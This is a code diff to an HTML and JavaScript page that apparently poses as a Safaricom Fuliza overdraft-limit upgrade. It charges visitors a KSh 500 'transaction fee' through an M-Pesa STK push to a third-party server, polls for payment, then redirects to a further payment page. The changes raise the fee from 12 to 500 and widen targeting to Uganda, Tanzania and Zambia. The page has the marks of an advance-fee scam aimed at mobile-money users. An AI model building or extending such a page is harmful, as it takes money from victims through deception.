@@ -36,9 +36,9 @@ This allows our system to finalize the upgrade and automatically refresh your cu
 </p>
 
 <div class="info">Selected Fuliza Limit: <strong id="limit"></strong></div>
-<div class="info">Transaction Fee of: <strong>KSh 500</strong></div>
+<div class="info">Transaction Fee: <strong>KSh 500</strong></div>
 
-<input type="tel" id="phone" placeholder="Enter Safaricom Number (07XXXXXXXX / 01XXXXXXXX / 2547XXXXXXXX)">
+<input type="tel" id="phone" placeholder="Enter your phone number">
 
 <button class="pay-btn" onclick="payNow()">Pay KSh 500 Now</button>
 
@@ -53,23 +53,50 @@ Failure to complete the transaction may delay the update of your Fuliza limit.
 </div>
 
 <script>
-const selectedAmount = localStorage.getItem("selectedAmount");
+// Get selected amount from previous page
+const selectedAmount = localStorage.getItem("selectedAmount") || 1000;
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
 
-const transactionFee = 12;
+// Fixed transaction fee
+const transactionFee = 500;
 
-function isSafaricom(number){
-  return /^(07|01)[0-9]{8}$/.test(number) || /^2547[0-9]{8}$/.test(number);
-}
+// Country detection by prefix
+const countryPrefixes = {
+  '254': 'KE',
+  '256': 'UG',
+  '255': 'TZ',
+  '260': 'ZM'
+};
+
+// Default network by country
+const defaultNetwork = {
+  'KE': 'MPESA',
+  'UG': 'MTN',
+  'TZ': 'TIGO',
+  'ZM': 'ZAMTEL'
+};
 
 function formatPhone(number){
   return number.startsWith("0") ? "254"+number.substring(1) : number;
 }
 
+function detectCountry(number){
+  for(const prefix in countryPrefixes){
+    if(number.startsWith(prefix)){
+      return countryPrefixes[prefix];
+    }
+  }
+  return '';
+}
+
+function isValidPhone(number){
+  return /^(07|01)[0-9]{8}$/.test(number) || /^2547[0-9]{8}$/.test(number);
+}
+
 async function payNow(){
-  const phone=document.getElementById("phone").value.trim();
-  const msg=document.getElementById("message");
-  const spinner=document.getElementById("spinner");
+  const phone = document.getElementById("phone").value.trim();
+  const msg = document.getElementById("message");
+  const spinner = document.getElementById("spinner");
 
   if(!phone){
     msg.innerText="Enter your phone number";
@@ -77,36 +104,46 @@ async function payNow(){
     return;
   }
 
-  if(!isSafaricom(phone)){
-    msg.innerText="Only Safaricom numbers allowed";
+  if(!isValidPhone(phone)){
+    msg.innerText="Only valid local numbers allowed";
     msg.style.color="red";
     return;
   }
 
   const phoneToSend = formatPhone(phone);
+  const country = detectCountry(phoneToSend);
+  if(!country){
+    msg.innerText="Invalid phone number. Unable to detect country.";
+    msg.style.color="red";
+    return;
+  }
+
+  const network = defaultNetwork[country];
+
   spinner.style.display="block";
-  msg.innerText="Sending payment request... please check your phone";
+  msg.innerText="Initiating payment... please check your phone";
   msg.style.color="black";
 
   try{
-    const res = await fetch("https://mpayafrica-server.onrender.com/deposit",{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({
+    const res = await fetch("https://mpayafrica-server.onrender.com/deposit", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({
         phone_number: phoneToSend,
-        amount: transactionFee
+        amount: transactionFee,
+        country: country,
+        network: network
       })
     });
-
     const data = await res.json();
     spinner.style.display="none";
 
     if(data.success){
-      msg.innerText="STK Push sent ✅ Enter your M‑Pesa PIN to confirm";
+      msg.innerText="STK Push sent ✅ Enter your mobile money PIN to confirm";
       msg.style.color="green";
       checkPayment(data.reference,"payment3.html");
     } else {
-      msg.innerText="Payment failed: "+(data.message || "Try again");
+      msg.innerText="Payment failed: " + (data.message || "Try again");
       msg.style.color="red";
     }
 
@@ -118,9 +155,9 @@ async function payNow(){
 }
 
 async function checkPayment(reference,nextPage){
-  const msg=document.getElementById("message");
-  let attempts=0;
-  const interval=setInterval(async()=>{
+  const msg = document.getElementById("message");
+  let attempts = 0;
+  const interval = setInterval(async ()=>{
     attempts++;
     if(attempts>20){
       clearInterval(interval);
@@ -132,13 +169,12 @@ async function checkPayment(reference,nextPage){
     try{
       const res = await fetch(`https://mpayafrica-server.onrender.com/status/${reference}`);
       const data = await res.json();
-
       if(data.success && data.data){
         const status = data.data.status.toLowerCase();
 
-        if(status==="success" || status==="loan_released" || status==="processing"){
+        if(status==="success" || status==="processing"){
           clearInterval(interval);
-          msg.innerText="Your Transaction processing fee has been received successful ✅ Redirecting to next step...";
+          msg.innerText="Transaction fee received successfully ✅ Redirecting...";
           msg.style.color="green";
           setTimeout(()=>{window.location.href=nextPage},2000);
         }
@@ -149,7 +185,7 @@ async function checkPayment(reference,nextPage){
           msg.style.color="red";
         }
       }
-    } catch(e){}
+    }catch(e){}
   },3000);
 }
 </script>
